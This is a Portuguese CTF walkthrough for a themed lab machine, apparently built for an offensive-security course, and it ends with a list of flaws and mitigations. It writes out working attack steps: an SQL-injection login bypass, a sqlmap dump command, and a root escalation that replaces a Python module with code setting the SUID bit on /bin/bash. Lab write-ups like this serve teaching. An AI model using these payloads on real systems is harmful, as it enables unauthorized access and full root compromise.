# Walkthrough Técnico — CTF Castelo Dimitrescu

> **AVISO:** Este documento contém a solução completa do desafio.
> Não leia se ainda quiser resolver por conta própria.

---

## Resumo do Ataque

```
[Recon] nmap → portas 22 (SSH) e 80 (HTTP)
    ↓
[Web] robots.txt → /servants_registry/ descoberto
    ↓
[Story] /portraits/ e /intrusion_report/ → pistas, iscas e detecção narrativa
    ↓
[Exploit] SQL Injection no login PHP (CWE-89)
    ↓
[Creds] Credenciais SSH expostas no dashboard (CWE-312)
    ↓
[Access] SSH como 'cassandra' → USER FLAG
    ↓
[Enum] sudo -l → rituals.py executável como root
    ↓
[Privesc] Python Library Hijacking em /opt/castle/utils/ (world-writable)
    ↓
[Root] /bin/bash -p → ROOT FLAG
```

---

## Fase 1 — Reconhecimento

### 1.1 Varredura de portas com nmap

```bash
nmap -sC -sV -p- --min-rate 5000 <IP_ALVO>
```

**Resultado esperado:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

Dois serviços expostos: SSH (22) e HTTP (80).

Em execução local via `docker compose`, as portas são publicadas no host como:

```text
8080/tcp -> HTTP 80 do container
2222/tcp -> SSH 22 do container
```

### 1.2 Enumeração Web

Acesse `http://<IP_ALVO>` no navegador ou via curl:

```bash
curl -s http://<IP_ALVO>
```

A página inicial revela:
- Um portal de gestão interna gótico
- Comentário no HTML fonte: `<!-- TODO: Remover link antigo do portal dos serviçais - /servants_registry/ -->`
- Link para a Galeria de Retratos

### 1.3 Verificação do robots.txt

```bash
curl -s http://<IP_ALVO>/robots.txt
```

**Resposta:**

```
User-agent: *
Disallow: /servants_registry/
Disallow: /blood_cellar/
Disallow: /castle_records/
Disallow: /intrusion_report/
Allow: /portraits/
```

O caminho `/servants_registry/` está explicitamente desabilitado, o que é um forte
indicativo de conteúdo interessante. Acesse diretamente:

```bash
curl -s http://<IP_ALVO>/servants_registry/
```

### 1.4 Exploração da Galeria de Retratos

Visitando `/portraits/`, o HTML fonte revela um comentário no retrato de Alcina:

```html
<!--
    alcina:Ethan_W1nt3rs_Bl00d_2024
    [ACESSO RESTRITO - nao compartilhar]
-->
```

Isso é uma credencial extra (conta administrativa), mas **não tem acesso SSH**
(a regra `AllowUsers cassandra` está ativa no SSH).

A galeria também contém uma credencial revogada de Bela como isca. Usá-la no portal
gera alerta narrativo, mas não bloqueia o desafio.

### 1.5 Detecção narrativa

O caminho `/blood_cellar/` retorna uma página 403 personalizada. O acesso é tratado
como alerta de Daniela Dimitrescu. O caminho `/intrusion_report/` resume os tipos de
detecção e reforça pistas sobre contas monitoradas e deploy dos módulos Python.

---

## Fase 2 — Exploração Web (SQL Injection)

### 2.1 Identificação da vulnerabilidade

Acesse `http://<IP_ALVO>/servants_registry/`. Você encontra um formulário de login.
O código PHP relevante é:

```php
$query = "SELECT * FROM servants
          WHERE username = '$username'
          AND   password = '$password'";
```

Nenhum prepared statement. Entrada diretamente interpolada na query. **SQLi clássica.**

### 2.2 Bypass de autenticação (SQLi)

Insira no campo **usuário**:

```
' OR '1'='1'--
```

E qualquer coisa no campo **senha**. Isso transforma a query em:

```sql
SELECT * FROM servants
WHERE username = '' OR '1'='1'--' AND password = '...'
```

O `OR '1'='1'` é sempre verdadeiro; o `--` comenta o resto.
A query retorna o primeiro registro → login efetuado.

**Alternativamente**, use o sqlmap para extração automatizada:

```bash
sqlmap -u "http://<IP_ALVO>/servants_registry/index.php" \
       --data="username=admin&password=admin" \
       --dbms=sqlite --dump
```

### 2.3 Extração de credenciais no dashboard

Após o login, o dashboard exibe **todos os serviçais com suas senhas em texto plano**
(CWE-312 — Cleartext Storage of Sensitive Information).

| # | Nome | Usuário | Senha | Função |
|---|------|---------|-------|--------|
| 3 | Cassandra Dimitrescu | `cassandra` | `bl00dM00n!` | Filha |
| ... | ... | ... | ... | ... |

A tabela revela que **cassandra** tem acesso SSH ativo ao servidor.

O dashboard também mostra ala, autorização e observações operacionais. A linha de
Cassandra indica que ela possui `SSH + Rituais`, conectando a credencial encontrada
ao próximo passo da invasão.

---

## Fase 3 — Acesso Inicial (SSH)

### 3.1 Conexão SSH

```bash
ssh cassandra@<IP_ALVO>
# Senha: bl00dM00n!

# (Em ambiente Docker com porta mapeada)
ssh -p 2222 cassandra@localhost
```

### 3.2 User Flag

```bash
cassandra@castle-dimitrescu:~$ cat user.txt
flag{c4ss4ndr4_d4ught3r_0f_bl00d_m00n}
```

**USER FLAG capturada.**

Após o login SSH, leia os arquivos narrativos:

```bash
cassandra@castle-dimitrescu:~$ cat mission_briefing.txt
cassandra@castle-dimitrescu:~$ cat patrol.log
```

Eles reforçam que Cassandra é confiável pelo sistema de rituais e apontam para
`/opt/castle/rituals.py` e `/opt/castle/utils`.

---

## Fase 4 — Enumeração Pós-Comprometimento

### 4.1 Verificação de sudo

```bash
cassandra@castle-dimitrescu:~$ sudo -l
```

**Saída:**

```
Matching Defaults entries for cassandra on castle-dimitrescu:
    env_reset, mail_badpass, ...

User cassandra may run the following commands on castle-dimitrescu:
    (root) NOPASSWD: /usr/bin/python3 /opt/castle/rituals.py
```

`cassandra` pode executar o script Python como **root sem senha**.

### 4.2 Análise do script de rituais

```bash
cat /opt/castle/rituals.py
cat /opt/castle/deploy_note.txt
```

Trecho relevante:

```python
sys.path.insert(0, '/opt/castle')
from utils import castle_helper   # ← importa de /opt/castle/utils/
```

O script importa `castle_helper` do diretório `/opt/castle/utils/`.

### 4.3 Inspeção das permissões do diretório

```bash
ls -la /opt/castle/
ls -la /opt/castle/utils/
```

**Resultado crítico:**

```
drwxrwxrwx 2 root root  /opt/castle/utils/
-rw-r--r-- 1 root root  /opt/castle/utils/castle_helper.py
```

O diretório `utils` está com **permissão 777 (world-writable)**.

Em Linux, permissão de escrita no **diretório** permite deletar e criar arquivos
dentro dele, independentemente das permissões do arquivo em si.
Isso expõe o sistema a **Python Library Hijacking**.

---

## Fase 5 — Escalação de Privilégios (Python Library Hijacking)

### 5.1 Conceito da vulnerabilidade

Quando `sudo python3 /opt/castle/rituals.py` executa, Python carrega os módulos
na ordem definida em `sys.path`. Como o script faz `sys.path.insert(0, '/opt/castle')`,
ele sempre vai procurar `utils/castle_helper.py` nesse diretório **primeiro**.

Se substituirmos esse arquivo por código malicioso, ele executará como **root**.

### 5.2 Substituição do módulo (payload)

```bash
# Remove o arquivo legítimo (possível pois o diretório é world-writable)
cassandra@castle-dimitrescu:~$ rm /opt/castle/utils/castle_helper.py

# Cria o módulo malicioso
cassandra@castle-dimitrescu:~$ cat > /opt/castle/utils/castle_helper.py << 'EOF'
import os

def perform_ritual():
    # Aplica SUID bit ao bash — permite execução como root sem sudo
    os.system('chmod +s /bin/bash')
    print("[+] Ritual de escalação concluído. O castelo é seu.")
EOF
```

### 5.3 Execução do script com sudo

```bash
cassandra@castle-dimitrescu:~$ sudo /usr/bin/python3 /opt/castle/rituals.py
```

**Saída:**

```
╔══════════════════════════════════════════════════════════╗
║         SISTEMA DE RITUAIS — CASTELO DIMITRESCU          ║
╚══════════════════════════════════════════════════════════╝
[*] Inicializando protocolo de ritual...
[*] Usuário efetivo: UID=0 (root)
[*] Carregando módulo auxiliar do castelo...

[+] Ritual de escalação concluído. O castelo é seu.
```

### 5.4 Obtenção do shell root via SUID bash

```bash
# Verifica o SUID bit no bash
cassandra@castle-dimitrescu:~$ ls -la /bin/bash
-rwsr-sr-x 1 root root /bin/bash    ← 's' = SUID ativo

# Executa bash com privilégios do owner (root)
cassandra@castle-dimitrescu:~$ /bin/bash -p

bash-5.0# whoami
root

bash-5.0# id
uid=1000(cassandra) gid=1000(cassandra) euid=0(root) egid=0(root)
```

---

## Fase 6 — Root Flag

```bash
bash-5.0# cat /root/root.txt
flag{l4dy_d1m1tr3scu_c4stl3_0wn3d_r00t}
```

**ROOT FLAG capturada. Castle Dimitrescu comprometido.**

---

## Vulnerabilidades Implementadas

| ID | Vulnerabilidade | Referência | Impacto |
|----|----------------|------------|---------|
| 1 | SQL Injection (login sem prepared statement) | CWE-89 / OWASP A03 | Bypass de autenticação |
| 2 | Cleartext Storage de senhas no banco | CWE-312 | Exposição de credenciais SSH |
| 3 | Sensitive Data Exposure no dashboard web | CWE-200 | Revelação de credenciais a usuários autenticados |
| 4 | Sudo misconfiguration (NOPASSWD para script Python) | — | Permite execução de código como root |
| 5 | Python Library Hijacking (diretório world-writable) | CWE-427 | Escalação de privilégios para root |
| 6 | Credenciais em comentário HTML (galeria) | CWE-615 | Exposição de dados sensíveis |
| 7 | Credencial revogada como isca | — | Detecção narrativa de tentativa errada |
| 8 | 403 temático em área proibida | — | Feedback narrativo sem bloquear o jogador |

---

## Técnicas Abordadas

- **Enumeração**: nmap, análise de robots.txt, source code review
- **Web Exploitation**: SQL Injection manual e via sqlmap
- **Escalação de Privilégios**: Python Library Hijacking + SUID bash
- **Sudo Abuse**: Exploração de regra NOPASSWD mal configurada

---

## Mitigações (Para Referência)

1. **SQLi** → Usar prepared statements / PDO com parâmetros
2. **Senhas em texto puro** → Hash bcrypt/argon2 + salt
3. **Exposição de dados** → Não exibir senhas em nenhuma interface
4. **Sudo** → Evitar NOPASSWD para scripts com imports externos
5. **Library Hijacking** → Remover write permission do diretório utils; usar `chmod 755`
6. **Comentários HTML** → Nunca incluir credenciais em comentários de código

---

*CTF desenvolvido para fins educacionais — Trabalho Final de Segurança Ofensiva*
*Tema: Resident Evil Village (2021) — Castelo Dimitrescu*
